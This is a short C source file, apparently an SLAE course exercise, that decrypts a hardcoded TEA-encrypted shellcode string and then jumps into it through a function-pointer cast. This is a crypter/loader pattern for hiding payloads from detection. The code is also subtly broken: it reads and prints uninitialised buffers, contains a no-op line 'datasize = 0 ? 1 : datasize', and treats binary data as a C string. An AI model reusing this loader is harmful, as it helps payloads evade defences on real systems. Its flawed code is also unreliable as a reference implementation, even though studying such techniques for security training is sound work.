/*
 * Author: 	Anastasios Monachos (secuid0) - [anastasiosm (at) gmail (dot) com]
 * SLAE-461
 * Description:	TEA (Tiny Encryption Algorithm) Decryption implementation
 * Version: 	v0.1
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* Official Code provided by Wheeler & Needham */
void decode(long *data, long *key) {
	unsigned long n = 32, sum, y = data[0], z = data[1],
	delta=0x9e3779b9;
	sum = delta << 5;
	while (n-- > 0) {
	     	z -= (y << 4) + (key[2]^y) + (sum^(y >> 5)) + key[3]; 
	     	y -= (z << 4) + (key[0]^z) + (sum^(z >> 5)) + key[1];
	     	sum -= delta;  
	}
	data[0] = y; 
	data[1] = z;  
}

/* Character Array Functions */
void decodestr(char *datastr, char *keystr) {
	int i = 0, datasize;
	long *data = (long *)datastr;
	long *key = (long *)keystr;
	datasize = strlen(datastr) / sizeof(long);
	datasize = 0 ? 1 : datasize;
	while (i < datasize) {
		decode(data, key);
		i += 2;
		data = (long *)datastr + i;
	}
}

int main() {
	char encrypted_shellcode[] = \
		"\xed\xa9\x6a\x99\x94\x08\xea\x48\x45\x3c\xe9\x8c\x83\xef\xeb\x43\x3c\xdb\xae\x1c\x23\xc5\x1e\xa0\x80"; //output from TEA-Crypter-Final
	
	int last;
	char *str, buff[512];
	char key[16] = "www.secuid0.net";
	
	str = encrypted_shellcode;

	if (str != NULL) {
	     	last = strlen(buff) - 1;
		if (buff[last] == '\n') buff[last] = '\0';
	}
	
	char buffer[512];
	puts(buffer);

	strcpy(buffer, str);
	decodestr(buffer, key);
	
	printf("\nDecrypted message= \"%s\"\n\n", buffer);

	//reference and the decrypted shellcode
	int (*ret)() = (int(*)())buffer;
	ret();
	
	return 0;
}

